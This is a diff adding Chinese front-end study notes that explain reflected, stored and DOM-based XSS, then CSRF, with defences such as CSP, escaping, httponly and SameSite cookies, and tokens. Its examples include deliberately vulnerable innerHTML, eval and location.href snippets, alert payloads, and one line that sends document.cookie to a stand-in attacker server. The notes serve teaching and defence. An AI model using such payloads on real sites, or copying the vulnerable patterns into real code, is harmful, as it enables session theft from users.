@@ -3990,13 +3990,103 @@ b.html
 
 跨域限制只在浏览器层面才会有，浏览器向代理服务器发送请求时就可以规避掉原始 url 无法跨域的问题。
 
-## XSS
+## ✔ XSS
 
-## CSRF
+人们经常将跨站脚本攻击（Cross Site Scripting）缩写为 CSS，但这会与层叠样式表（Cascading Style Sheets，CSS）的缩写混淆。因此，有人将跨站脚本攻击缩写为 XSS。
+
+跨站脚本攻击（XSS），是最普遍的 Web 应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。
+
+XSS 分为以下几种：
+
+**1、反射型 XSS**
+
+**发请求时，XSS 代码出现在 URL 中，提交给服务端**。服务端返回的内容，也带上了这段 XSS 代码。最后浏览器执行 XSS 代码。
+
+比如请求这样一个网站：`http://www.hasxss.com?x=document.cookie`，服务端会把 `x` 的值替换到 html 模板中。
+
+```html
+<script>
+  alert({{query.x}});
+</script>
+```
+
+这样，页面就会弹出 cookie 信息，如果攻击者把 `x` 改成 `new Image().src = 'http://www.xss.com?data=' + document.cookie;`，这样用户的隐私信息就可能被上传到攻击者服务器。
+
+**2、存储型 XSS**
+
+存储型和反射型的区别就是，提交的 XSS 代码会存储在服务器端。这种 XSS 也是最危险的。
+
+例如用户将 `<script>alert(document.cookie)<script>` 这段代码提交到了数据库，然后其他用户在访问的时候页面没有经过转义就执行了这段代码，就会导致访问者的信息泄露。
+
+**3、DOM 型 XSS**
+
+这种和上面说的两种的区别就在于，DOM XSS 不需要服务端参与，可以认为是前端代码漏洞导致。
+
+参考：[浅谈 Dom Xss](https://xz.aliyun.com/t/5181)
+
+当页面代码直接使用 url 传输的参数而不进行安全处理时可能会发生 DOM XSS：
+
+**location.href**
+
+变量 hash 为可控部分，并带入 url 中，变量 `hash` 控制的是 `#` 之后的部分，那么可以使用伪协议 `#javascript:alert(1)`。
+
+```javascript
+// #javascript:alert(1)
+var hash = location.hash
+if (hash) {
+  var url = hash.substring(1)
+  location.href = url
+}
+```
+
+![](https://qiniu1.lxfriday.xyz/feoffer/8f3ee330-192c-2975-552d-1924bfb76c22.png)
+
+**innerHTML**
+
+```javascript
+// #<svg%20onload="alert('what')"></svg>
+var hash = location.hash
+const display = document.getElementById('display')
+if (hash) {
+  var text = unescape(hash.substring(1))
+  display.innerHTML = text
+}
+```
+
+![](https://qiniu1.lxfriday.xyz/feoffer/1875ffdd-cc17-f4e6-c4a5-028d2d5c2990.png)
+
+**eval**
+
+```javascript
+// #';alert(1);//
+eval("var x = '" + location.hash + "'")
+```
+
+![](https://qiniu1.lxfriday.xyz/feoffer/fbb679cd-67b3-c991-dedd-5e0a3304ed3b.png)
+
+### ✔ 防御措施
+
+- CSP
+- 不要相信用户输入的内容，对用户输入的内容转义
+
+## ✔ CSRF
 
 ref
 
 - [https://juejin.im/post/5b6b08956fb9a04fc67c2263](https://juejin.im/post/5b6b08956fb9a04fc67c2263)
+
+跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的 Web 应用程序上执行非本意的操作的攻击方法。XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。
+
+由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。这利用了 web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。
+
+### ✔ 防御措施
+
+- Get 请求不对数据进行修改；
+- 关键 Cookie 使用 httponly，不让脚本访问关键 cookie；
+- cookie samesite 属性，禁止恶意请求中携带本页面的 cookie；
+- CSP；
+- 请求时附带验证信息，比如 Token（服务端下发 Token，请求时附带上，由服务端验证 Token 是否有效）；
+- 服务端验证 http referer 头信息（防止从第三方网站发起请求）；
 
 ## Chrome 架构
 
